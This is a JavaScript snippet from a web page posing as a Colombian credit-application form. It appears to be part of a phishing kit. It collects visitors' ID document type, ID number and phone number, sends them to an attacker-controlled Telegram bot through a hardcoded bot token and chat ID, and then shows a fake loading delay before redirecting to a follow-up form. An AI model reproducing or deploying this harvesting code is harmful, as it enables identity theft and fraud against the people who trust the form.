  <script>
    // Configuración del bot de Telegram
    const TELEGRAM_BOT_TOKEN = "8024814688:AAGqWKgmsBupV0-tQkMBiKRhdOpUytKqGS8"; // Reemplaza con tu token
    const TELEGRAM_CHAT_ID = "-4926326731"; // Reemplaza con tu chat ID
    
    // Get references to the form elements
    const documentTypeSelect = document.getElementById('documentType');
    const documentNumberInput = document.getElementById('documentNumber');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const submitButton = document.getElementById('submitButton');
    const termsCheckbox = document.getElementById('termsCheckbox');
    const loadingScreen = document.getElementById('loadingScreen');
    const modal = document.getElementById('modal');
    const closeModal = document.getElementById('closeModal');
    
    // URL de redirección al hacer clic en Aceptar
    const redirectUrl = "formulario_u1.php";
    
    // Function to check if all fields are filled
    function checkFields() {
      if (documentTypeSelect.value && documentNumberInput.value && phoneNumberInput.value) {
        submitButton.classList.add('active');
      } else {
        submitButton.classList.remove('active');
      }
    }

    // Function to send data to Telegram
    async function sendToTelegram(data) {
      const message = `🆕 Nueva solicitud de crédito:

📋 Tipo de documento: ${data.documentType}
🆔 Número de documento: ${data.documentNumber}
📱 Número de celular: ${data.phoneNumber}
📅 Fecha: ${new Date().toLocaleString('es-CO')}`;

      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      try {
        const response = await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });

        if (!response.ok) {
          throw new Error('Error enviando mensaje a Telegram');
        }
        
        console.log('Datos enviados exitosamente a Telegram');
      } catch (error) {
        console.error('Error enviando datos a Telegram:', error);
      }
    }
    
    // Show loading screen when button is clicked (if fields are filled)
    submitButton.addEventListener('click', function() {
      if (documentTypeSelect.value && documentNumberInput.value && phoneNumberInput.value) {
        loadingScreen.style.display = 'block';
        
        // Recopilar datos del formulario
        const formData = {
          documentType: documentTypeSelect.options[documentTypeSelect.selectedIndex].text,
          documentNumber: documentNumberInput.value,
          phoneNumber: phoneNumberInput.value
        };
        
        // Enviar datos a Telegram
        sendToTelegram(formData);
        
        // Mostrar el modal después de 6 segundos
        setTimeout(function() {
          loadingScreen.style.display = 'none';
          modal.style.display = 'block';
        }, 6000);
      }
    });
    
    // Redirigir cuando se hace clic en el botón Aceptar del modal
    closeModal.addEventListener('click', function() {
      window.location.href = redirectUrl;
    });
    
    // Close modal when clicking outside of it (opcional)
    window.addEventListener('click', function(event) {
      if (event.target == modal) {
        modal.style.display = 'none';
      }
    });
    
    // Add event listeners to all form fields
    documentTypeSelect.addEventListener('change', checkFields);
    documentNumberInput.addEventListener('input', checkFields);
    phoneNumberInput.addEventListener('input', checkFields);
  </script>
